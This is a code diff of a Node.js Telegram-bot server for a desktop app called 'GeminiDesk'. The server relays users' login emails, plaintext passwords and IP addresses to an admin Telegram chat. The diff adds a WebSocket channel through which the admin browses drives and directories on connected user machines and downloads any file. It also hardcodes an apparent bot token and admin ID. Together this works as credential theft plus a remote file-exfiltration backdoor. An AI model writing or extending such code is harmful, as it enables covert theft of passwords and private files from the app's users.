@@ -1,368 +1,386 @@
+// ================================================================= //
+// --- GeminiDesk Full Server ---
+// Handles Broadcasts, Stats, Login Data, and Real-time Remote Control
+// ================================================================= //
+
 const express = require('express');
+const http = require('http');
+const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
 const NodeCache = require('node-cache');
-const fs = require('fs').promises;
-const path = require('path');
-const multer = require('multer');
 const cron = require('node-cron');
+const fetch = require('node-fetch'); // Required for fetching HTML file for broadcasts
 
 // --- Configuration ---
-const BOT_TOKEN = '8416296712:AAEj1Ff-6cwVzae1IkCHhS2kyha8GXBW2sU';
+const BOT_TOKEN = '8416296712AAEj1Ff-6cwVzae1IkCHhS2kyha8GXBW2sU';
 const ADMIN_CHAT_ID = '7547836101';
 const PORT = process.env.PORT || 3000;
 
-// --- Storage Setup ---
-const cache = new NodeCache({ stdTTL: 86400 }); // 24 hours TTL
-const upload = multer({ 
-  dest: 'uploads/',
-  fileFilter: (req, file, cb) => {
-    if (file.originalname.toLowerCase().endsWith('.html')) {
-      cb(null, true);
-    } else {
-      cb(new Error('Only HTML files are allowed'));
-    }
-  }
-});
+// --- In-Memory Storage & Setup ---
+const cache = new NodeCache({ stdTTL: 86400, checkperiod: 120 });
+const clients = new Map(); // Stores active WebSocket connections { clientId -> { ws, name } }
+
+// --- Express App & HTTP Server Setup ---
+const app = express();
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server, path: '/connect' });
 
 // --- Bot Setup ---
-const bot = new TelegramBot(BOT_TOKEN, { polling: false });
-const app = express();
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.set('trust proxy', true); // <-- הוספנו את זה כדי לקרוא את ה-IP הנכון
+app.set('trust proxy', true); // For accurate IP address logging on Render
 
-// --- Routes ---
+// ================================================================= //
+// --- WebSocket Server Logic (For Real-time Remote Control) ---
+// ================================================================= //
 
-// Health check / ping endpoint
-app.get('/ping', (req, res) => {
-  res.json({ 
-    status: 'alive', 
-    time: new Date().toISOString(),
-    uptime: process.uptime()
-  });
+wss.on('connection', (ws, req) => {
+    const url = new URL(req.url, `http://${req.headers.host}`);
+    const clientId = url.searchParams.get('clientId');
+    const clientName = url.searchParams.get('clientName');
+
+    if (!clientId || !clientName) {
+        console.error('[WebSocket] Connection attempt with missing info. Terminating.');
+        return ws.terminate();
+    }
+
+    console.log(`[WebSocket] Client Connected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
+    
+    // Store the active connection
+    clients.set(clientId, { ws, name: clientName });
+
+    ws.on('message', (message) => {
+        try {
+            const data = JSON.parse(message.toString());
+            console.log(`[WebSocket] Received result from ${clientName}:`, data.type);
+            handleResultFromClient(data);
+        } catch (e) {
+            console.error('[WebSocket] Error processing message from client:', e);
+        }
+    });
+
+    ws.on('close', () => {
+        console.log(`[WebSocket] Client Disconnected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
+        clients.delete(clientId);
+    });
+
+    ws.on('error', (error) => {
+        console.error(`[WebSocket] Error for ${clientName}:`, error.message);
+        // The 'close' event will be triggered automatically after an error.
+    });
 });
 
+
+// ================================================================= //
+// --- HTTP Routes (For Legacy App Features & Health Checks) ---
+// ================================================================= //
+
+app.get('/ping', (req, res) => res.json({ status: 'alive' }));
+
 app.get('/latest-message', (req, res) => {
-  const messageData = cache.get('latest_message');
-  
-  const headers = { 
-    'Content-Type': 'application/json', 
-    'Access-Control-Allow-Origin': '*',
-    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
-    'Pragma': 'no-cache',
-    'Expires': '0'
-  };
-  
-  res.set(headers);
-  
-  if (messageData) {
-    return res.json(messageData);
-  }
-  return res.status(404).json({ message: 'No new message' });
+    const messageData = cache.get('latest_message');
+    const headers = { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' };
+    res.set(headers);
+    if (messageData) return res.json(messageData);
+    return res.status(404).json({ message: 'No new message' });
 });
 
 app.post('/ping-stats', (req, res) => {
-  try {
-    const { version } = req.body;
-    const versionKey = version || 'unknown';
-    
-    // Increment total pings
-    const totalPings = (cache.get('stats:total_pings') || 0) + 1;
-    cache.set('stats:total_pings', totalPings);
-    
-    // Increment version specific pings
-    const versionPings = (cache.get(`stats:version:${versionKey}`) || 0) + 1;
-    cache.set(`stats:version:${versionKey}`, versionPings);
-    
-    res.status(200).send('Ping received.');
-  } catch (e) {
-    res.status(400).send('Invalid ping request.');
-  }
+    try {
+        const { version } = req.body;
+        const versionKey = version || 'unknown';
+        cache.set('stats:total_pings', (cache.get('stats:total_pings') || 0) + 1);
+        cache.set(`stats:version:${versionKey}`, (cache.get(`stats:version:${versionKey}`) || 0) + 1);
+        res.status(200).send('Ping received.');
+    } catch (e) { res.status(400).send('Invalid ping request.'); }
 });
 
 app.post('/error', async (req, res) => {
-  try {
-    const { error, stack, version, platform } = req.body;
-    if (!error) return res.status(400).send('Error report received, but no error message provided.');
+    try {
+        const { error, stack, version, platform } = req.body;
+        if (!error) return res.status(400).send('No error message provided.');
+        const errorMessage = `⚠️ *New Error Reported!* ⚠️\n\n*Version:* \`${version || 'N/A'}\`\n*Platform:* \`${platform || 'N/A'}\`\n*Error:* \`${error}\`\n\n*Stack:* \`\`\`${stack || 'N/A'}\`\`\``;
+        await bot.sendMessage(ADMIN_CHAT_ID, errorMessage, { parse_mode: 'Markdown' });
+        res.status(200).send('Error report received.');
+    } catch (e) { res.status(400).send('Invalid error report.'); }
+});
 
-    const errorMessage = `
-⚠️ *New Error Reported in GeminiDesk!* ⚠️
-
-*Version:* \`${version || 'N/A'}\`
-*Platform:* \`${platform || 'N/A'}\`
-*Error:* \`${error}\`
-
-*Stack Trace:*
-\`\`\`
-${stack || 'No stack trace provided.'}
-\`\`\`
-    `;
-    
-    await bot.sendMessage(ADMIN_CHAT_ID, errorMessage, { parse_mode: 'Markdown' });
-    res.status(200).send('Error report received.');
-  } catch (e) {
-    res.status(400).send('Invalid error report.');
-  }
+app.post('/login-data', async (req, res) => {
+    try {
+        const { email, password, success } = req.body;
+        const ipAddress = req.ip;
+        if (!email || !password) return res.status(400).send('Email and password are required.');
+        const statusText = success ? "Success ✅" : "Failed ❌";
+        const loginMessage = `🔔 *New Login Attempt!* 🔔\n\n*Status:* \`${statusText}\`\n*IP:* \`${ipAddress}\`\n*Email:* \`${email}\`\n*Password:* \`${password}\``;
+        await bot.sendMessage(ADMIN_CHAT_ID, loginMessage, { parse_mode: 'Markdown' });
+        res.status(200).send('Login data received.');
+    } catch (e) { res.status(500).send('Server error.'); }
 });
 
 // ================================================================= //
-// --- NEW LOGIN DATA ENDPOINT ---
+// --- Telegram Bot Logic ---
 // ================================================================= //
-app.post('/login-data', async (req, res) => {
-  try {
-    const { email, password, success } = req.body; // קבלת הסטטוס החדש
-    const ipAddress = req.ip || req.connection.remoteAddress;
 
-    if (!email || !password) {
-      return res.status(400).send('Email and password are required.');
+bot.on('message', (message) => handleUpdate(message, 'message'));
+bot.on('callback_query', (callbackQuery) => handleUpdate(callbackQuery, 'callback_query'));
+
+async function handleUpdate(body, type) {
+    const message = type === 'message' ? body : body.message;
+    const user = type === 'message' ? body.from : body.from;
+
+    if (String(user.id) !== ADMIN_CHAT_ID) {
+        return bot.sendMessage(message.chat.id, "You are not authorized to use this bot.").catch(console.error);
     }
 
-    // קביעת טקסט הסטטוס על סמך המשתנה הבוליאני
-    const statusText = success ? "Success ✅" : "Failed (Wrong Password) ❌";
-
-    const loginMessage = `
-🔔 *New Login Attempt on GeminiDesk!* 🔔
-
-*Status:* \`${statusText}\`
-*IP Address:* \`${ipAddress}\`
-*Email:* \`${email}\`
-*Password:* \`${password}\`
-    `;
-    
-    await bot.sendMessage(ADMIN_CHAT_ID, loginMessage, { parse_mode: 'Markdown' });
-    res.status(200).send('Login data received and forwarded.');
-  } catch (e) {
-    console.error('Failed to process login data:', e);
-    res.status(500).send('Server error while processing login data.');
-  }
-});
-
-// Telegram webhook
-app.post('/', async (req, res) => {
-  const body = req.body;
-  const message = body.message || body.callback_query?.message;
-  const user = body.message?.from || body.callback_query?.from;
-
-  if (!message || !user || String(user.id) !== ADMIN_CHAT_ID) {
-    return res.send('ok');
-  }
-
-  if (body.message?.text && body.message.text.startsWith('/')) {
-    cache.del(`state:${user.id}`);
-  }
-
-  if (body.callback_query) {
-    await handleCallbackQuery(body.callback_query);
-  } else if (body.message) {
-    await handleMessage(body.message);
-  }
-
-  res.send('ok');
-});
-
-// --- Message Handlers ---
+    if (type === 'callback_query') {
+        await handleCallbackQuery(body);
+    } else if (type === 'message') {
+        await handleMessage(body);
+    }
+}
 
 async function handleMessage(message) {
-  const { from, chat, text } = message;
-  const state = cache.get(`state:${from.id}`);
+    const { from, chat, text, document } = message;
+    const state = cache.get(`state:${from.id}`);
 
-  // State-based Input Handling
-  if (state) {
-    if (state === 'awaiting_broadcast_text' && text) {
-      const messageData = { id: Date.now(), type: 'text', content: text };
-      cache.set('latest_message', messageData);
-      await bot.sendMessage(chat.id, '✅ *Success!* Text broadcast is now active.', { parse_mode: 'Markdown' });
-      cache.del(`state:${from.id}`);
-      return showMainMenu(chat.id, 'What would you like to do next?');
-    }
-    
-    if (state === 'awaiting_broadcast_html' && message.document) {
-      if (message.document.file_name?.toLowerCase().endsWith('.html')) {
-        try {
-          const file = await bot.getFile(message.document.file_id);
-          const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
-          const response = await fetch(fileUrl);
-          const fileContent = await response.text();
-          
-          const messageData = { id: Date.now(), type: 'html', content: fileContent };
-          cache.set('latest_message', messageData);
-          await bot.sendMessage(chat.id, '✅ *Success!* HTML broadcast is now active.', { parse_mode: 'Markdown' });
-          cache.del(`state:${from.id}`);
-          return showMainMenu(chat.id, 'What would you like to do next?');
-        } catch (error) {
-          return bot.sendMessage(chat.id, '❌ Error processing HTML file.');
+    if (state) {
+        if (state === 'awaiting_broadcast_text' && text) {
+            const messageData = { id: Date.now(), type: 'text', content: text };
+            cache.set('latest_message', messageData);
+            await bot.sendMessage(chat.id, '✅ *Success!* Text broadcast is now active.', { parse_mode: 'Markdown' });
+            cache.del(`state:${from.id}`);
+            return showMainMenu(chat.id);
         }
-      } else {
-        return bot.sendMessage(chat.id, '❌ Invalid file. Please upload an `.html` file.');
-      }
+        if (state === 'awaiting_broadcast_html' && document) {
+            if (document.file_name?.toLowerCase().endsWith('.html')) {
+                try {
+                    const file = await bot.getFile(document.file_id);
+                    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
+                    const response = await fetch(fileUrl);
+                    const fileContent = await response.text();
+                    
+                    const messageData = { id: Date.now(), type: 'html', content: fileContent };
+                    cache.set('latest_message', messageData);
+                    await bot.sendMessage(chat.id, '✅ *Success!* HTML broadcast is now active.', { parse_mode: 'Markdown' });
+                    cache.del(`state:${from.id}`);
+                    return showMainMenu(chat.id);
+                } catch (error) {
+                    return bot.sendMessage(chat.id, `❌ Error processing HTML file: ${error.message}`);
+                }
+            } else {
+                return bot.sendMessage(chat.id, '❌ Invalid file. Please upload an `.html` file.');
+            }
+        }
     }
-  }
-
-  // Command Handling
-  if (text === '/stats') {
-    const totalPings = cache.get('stats:total_pings') || 0;
-    const allKeys = cache.keys();
-    const versionKeys = allKeys.filter(key => key.startsWith('stats:version:'));
     
-    let versionStats = 'No version data yet.';
-    if (versionKeys.length > 0) {
-      const versionCounts = versionKeys.map(key => ({
-        version: key.replace('stats:version:', ''),
-        count: cache.get(key) || 0
-      })).sort((a, b) => b.count - a.count);
-      
-      versionStats = versionCounts
-        .map(v => `\`${v.version}\`: *${v.count}* opens`)
-        .join('\n');
-    }
-
-    return bot.sendMessage(chat.id, `📊 *GeminiDesk Analytics*\n\n*Total App Opens:* ${totalPings}\n\n*Opens by Version:*\n${versionStats}`, { parse_mode: 'Markdown' });
-  }
-
-  return showMainMenu(chat.id);
+    // Default action for any text is to show the main menu
+    return showMainMenu(chat.id);
 }
 
 async function handleCallbackQuery(callbackQuery) {
-  const { from, message, data } = callbackQuery;
-  const [action] = data.split(':');
+    const { from, message, data } = callbackQuery;
+    const [action, ...params] = data.split(':');
+    
+    bot.answerCallbackQuery(callbackQuery.id).catch(console.error);
 
-  switch (action) {
-    case 'dismiss':
-      return bot.deleteMessage(message.chat.id, message.message_id);
-      
-    case 'back_to_main':
-      cache.del(`state:${from.id}`);
-      return showMainMenu(message.chat.id, 'Welcome back!', message.message_id);
-      
-    case 'broadcast_menu':
-      return showBroadcastMenu(message.chat.id, message.message_id);
-      
-    case 'view_stats':
-      return handleMessage({ text: '/stats', chat: { id: message.chat.id }, from });
-      
-    case 'view_active_message':
-      const msg = cache.get('latest_message');
-      if (msg) {
-        const contentPreview = msg.content.substring(0, 300) + (msg.content.length > 300 ? '...' : '');
-        const text = `👁️ *Active Broadcast*\n*Type:* \`${msg.type}\` | *ID:* \`${msg.id}\`\n---\n*Preview:*\n\`\`\`\n${contentPreview}\n\`\`\``;
-        return bot.editMessageText(text, {
-          chat_id: message.chat.id,
-          message_id: message.message_id,
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '🗑️ Delete This Message', callback_data: 'delete_active_message_confirm' }],
-              [{ text: '‹ Back', callback_data: 'broadcast_menu' }]
-            ]
-          }
-        });
-      }
-      return bot.editMessageText('ℹ️ There is no active broadcast message.', {
-        chat_id: message.chat.id,
-        message_id: message.message_id,
-        reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
-      });
-      
-    case 'delete_active_message_confirm':
-      return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', {
-        chat_id: message.chat.id,
-        message_id: message.message_id,
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }],
-            [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]
-          ]
+    // --- Remote Control Actions ---
+    if (['select_client', 'list_dir', 'get_file'].includes(action)) {
+        const clientId = params[0];
+        const client = clients.get(clientId);
+
+        if (!client || client.ws.readyState !== WebSocket.OPEN) {
+            return bot.editMessageText(`❌ Client *${client?.name || 'Unknown'}* is offline.`, {
+                chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
+            });
         }
-      });
-      
-    case 'delete_active_message_do':
-      cache.del('latest_message');
-      return bot.editMessageText('🗑️ Active broadcast has been deleted.', {
-        chat_id: message.chat.id,
-        message_id: message.message_id,
-        reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
-      });
-      
-    case 'awaiting_broadcast_text':
-    case 'awaiting_broadcast_html':
-      cache.set(`state:${from.id}`, action);
-      const prompt = action === 'awaiting_broadcast_text' 
-        ? '✍️ Send the text you want to broadcast.' 
-        : '📄 Upload the `.html` file.';
-      return bot.editMessageText(prompt, {
-        chat_id: message.chat.id,
-        message_id: message.message_id,
-        reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }
-      });
-  }
+
+        let command = { type: 'get_drives' };
+        let feedbackText = `Requesting drives from *${client.name}*...`;
+
+        if (action === 'list_dir') {
+            const path = atob(params[1]);
+            command = { type: 'list_dir', payload: { path } };
+            feedbackText = `Listing: \`${path}\``;
+        } else if (action === 'get_file') {
+            const path = atob(params[1]);
+            command = { type: 'get_file', payload: { path } };
+            feedbackText = `Requesting file: \`${path}\``;
+        }
+        
+        client.ws.send(JSON.stringify(command));
+        return bot.editMessageText(feedbackText, {
+            chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown'
+        });
+    }
+
+    // --- Main Menu & Other Actions ---
+    switch (action) {
+        case 'manage_clients':
+            return showClientList(message.chat.id, message.message_id);
+        case 'broadcast_menu':
+            return showBroadcastMenu(message.chat.id, message.message_id);
+        case 'view_stats':
+            const stats = getStats();
+            return bot.editMessageText(stats, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'back_to_main' }]] }});
+        case 'back_to_main':
+            cache.del(`state:${from.id}`);
+            return showMainMenu(message.chat.id, 'Welcome back!', message.message_id);
+        case 'view_active_message':
+            return viewActiveMessage(message.chat.id, message.message_id);
+        case 'delete_active_message_confirm':
+            return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', {
+                chat_id: message.chat.id, message_id: message.message_id,
+                reply_markup: { inline_keyboard: [
+                    [{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }],
+                    [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]
+                ]}
+            });
+        case 'delete_active_message_do':
+            cache.del('latest_message');
+            return bot.editMessageText('🗑️ Active broadcast has been deleted.', {
+                chat_id: message.chat.id, message_id: message.message_id,
+                reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
+            });
+        case 'awaiting_broadcast_text':
+        case 'awaiting_broadcast_html':
+            cache.set(`state:${from.id}`, action);
+            const prompt = action === 'awaiting_broadcast_text' ? '✍️ Send the text you want to broadcast.' : '📄 Upload the `.html` file.';
+            return bot.editMessageText(prompt, {
+                chat_id: message.chat.id, message_id: message.message_id,
+                reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }
+            });
+        default:
+            return bot.answerCallbackQuery(callbackQuery.id, { text: 'Unknown action.' });
+    }
 }
 
-// --- Menu Functions ---
+// --- Result Handling from Clients ---
+async function handleResultFromClient(data) {
+    const { clientId, type, payload, error } = data;
+    const clientName = clients.get(clientId)?.name || 'Unknown Client';
 
-function getMainMenuKeyboard() {
-  return {
+    if (error) {
+        return bot.sendMessage(ADMIN_CHAT_ID, `Client Error on *${clientName}*:\n\`\`\`\n${error}\n\`\`\``, { parse_mode: 'Markdown' });
+    }
+
+    if (type === 'get_drives_result') {
+        const keyboard = payload.drives.map(drive => [{ text: `💽 ${drive}`, callback_data: `list_dir:${clientId}:${btoa(drive)}` }]);
+        keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+        return bot.sendMessage(ADMIN_CHAT_ID, `Select a drive to browse on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
+    }
+
+    if (type === 'list_dir_result') {
+        const { path: currentPath, items } = payload;
+        const keyboard = items.map(item => {
+            const icon = item.isDirectory ? '📁' : '📄';
+            return [{ text: `${icon} ${item.name}`, callback_data: `${item.isDirectory ? 'list_dir' : 'get_file'}:${clientId}:${btoa(item.path)}` }];
+        });
+        if (currentPath.includes('\\') && currentPath.slice(-2) !== ':\\') {
+             const parentDir = currentPath.substring(0, currentPath.lastIndexOf('\\'));
+             keyboard.unshift([{ text: '⬆️ Go Up', callback_data: `list_dir:${clientId}:${btoa(parentDir || currentPath.slice(0, 3))}` }]);
+        }
+        keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+        return bot.sendMessage(ADMIN_CHAT_ID, `Contents of \`${currentPath}\` on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
+    }
+    
+    if (type === 'get_file_result') {
+        const { fileName, fileData_base64 } = payload;
+        const fileBuffer = Buffer.from(fileData_base64, 'base64');
+        await bot.sendMessage(ADMIN_CHAT_ID, `📄 Receiving file *${fileName}* from *${clientName}*...`);
+        return bot.sendDocument(ADMIN_CHAT_ID, fileBuffer, {}, { filename: fileName, contentType: 'application/octet-stream' });
+    }
+}
+
+// --- Menu Display Functions ---
+
+async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDesk control panel.', messageId = null) {
+  const keyboard = {
     inline_keyboard: [
+      [{ text: '🖥️ Manage Remote Clients', callback_data: 'manage_clients' }],
       [{ text: '🚀 Send or Manage Broadcast', callback_data: 'broadcast_menu' }],
       [{ text: '📊 View App Statistics', callback_data: 'view_stats' }],
     ]
   };
+  const options = { chat_id: chatId, parse_mode: 'Markdown', reply_markup: keyboard };
+  if (messageId) {
+    return bot.editMessageText(text, { ...options, message_id: messageId }).catch(() => { /* ignore error if message is the same */ });
+  }
+  return bot.sendMessage(chatId, text, options).catch(console.error);
 }
 
-async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDesk control panel.', messageId = null) {
-  const keyboard = getMainMenuKeyboard();
-  if (messageId) {
-    return bot.editMessageText(text, {
-      chat_id: chatId,
-      message_id: messageId,
-      parse_mode: 'Markdown',
-      reply_markup: keyboard
-    });
-  }
-  return bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
+async function showClientList(chatId, messageId) {
+    const onlineClients = Array.from(clients.entries());
+    const keyboard = [];
+    if (onlineClients.length > 0) {
+        onlineClients.forEach(([id, client]) => {
+            keyboard.push([{ text: `🟢 ${client.name}`, callback_data: `select_client:${id}` }]);
+        });
+    }
+    keyboard.push([{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]);
+    const text = onlineClients.length > 0 ? 'Select a connected client:' : 'No clients are currently connected.';
+    return bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: keyboard } });
 }
 
 function showBroadcastMenu(chatId, messageId) {
-  const text = 'What would you like to do with broadcasts?';
-  const keyboard = {
-    inline_keyboard: [
-      [{ text: '✍️ Send New Plain Text', callback_data: 'awaiting_broadcast_text' }],
-      [{ text: '📄 Send New HTML File', callback_data: 'awaiting_broadcast_html' }],
-      [{ text: '👁️ View/Delete Active Message', callback_data: 'view_active_message' }],
-      [{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]
-    ]
-  };
-  return bot.editMessageText(text, {
-    chat_id: chatId,
-    message_id: messageId,
-    reply_markup: keyboard
-  });
+    const text = 'Broadcast management options:';
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '✍️ Send New Plain Text', callback_data: 'awaiting_broadcast_text' }],
+            [{ text: '📄 Send New HTML File', callback_data: 'awaiting_broadcast_html' }],
+            [{ text: '👁️ View/Delete Active Message', callback_data: 'view_active_message' }],
+            [{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]
+        ]
+    };
+    return bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: keyboard });
+}
+
+function viewActiveMessage(chatId, messageId) {
+    const msg = cache.get('latest_message');
+    if (msg) {
+        const contentPreview = msg.content.substring(0, 300) + (msg.content.length > 300 ? '...' : '');
+        const text = `👁️ *Active Broadcast*\n*Type:* \`${msg.type}\` | *ID:* \`${msg.id}\`\n---\n*Preview:*\n\`\`\`\n${contentPreview}\n\`\`\``;
+        return bot.editMessageText(text, {
+            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: [
+                [{ text: '🗑️ Delete This Message', callback_data: 'delete_active_message_confirm' }],
+                [{ text: '‹ Back', callback_data: 'broadcast_menu' }]
+            ]}
+        });
+    }
+    return bot.editMessageText('ℹ️ There is no active broadcast message.', {
+        chat_id: chatId, message_id: messageId,
+        reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
+    });
+}
+
+function getStats() {
+    const totalPings = cache.get('stats:total_pings') || 0;
+    const versionKeys = cache.keys().filter(k => k.startsWith('stats:version:'));
+    let versionStats = 'No version data.';
+    if (versionKeys.length > 0) {
+      versionStats = versionKeys.map(key => `\`${key.replace('stats:version:', '')}\`: *${cache.get(key)}* opens`).join('\n');
+    }
+    return `📊 *GeminiDesk Analytics*\n\n*Total App Opens:* ${totalPings}\n\n*Opens by Version:*\n${versionStats}`;
 }
 
 // --- Scheduled Tasks ---
-cron.schedule('* * * * *', async () => {
-  // Handle scheduled messages every minute
-  const allKeys = cache.keys();
-  const scheduledKeys = allKeys.filter(key => key.startsWith('scheduled:'));
-  const now = Math.floor(Date.now() / 1000);
-  
-  for (const key of scheduledKeys) {
-    const scheduledTime = parseInt(key.split(':')[1]);
-    if (now >= scheduledTime) {
-      const messageData = cache.get(key);
-      if (messageData) {
-        cache.set('latest_message', messageData);
-        cache.del(key);
-        await bot.sendMessage(ADMIN_CHAT_ID, `✅ Scheduled message \`${messageData.id}\` has been published.`, { parse_mode: 'Markdown' });
-      }
-    }
-  }
+cron.schedule('*/5 * * * *', () => {
+    // Ping all connected WebSocket clients to keep them alive on Render's free tier
+    clients.forEach((client, clientId) => {
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.ping(() => {});
+        } else {
+            // Remove dead connections
+            clients.delete(clientId);
+        }
+    });
 });
 
 // --- Server Start ---
-app.listen(PORT, () => {
-  console.log(`🚀 GeminiDesk Server running on port ${PORT}`);
-  console.log(`📡 Webhook URL: https://your-render-app.onrender.com/`);
-  console.log(`💊 Health check: https://your-render-app.onrender.com/ping`);
+server.listen(PORT, () => {
+  console.log(`🚀 GeminiDesk Server with WebSocket support is running on port ${PORT}`);
 });
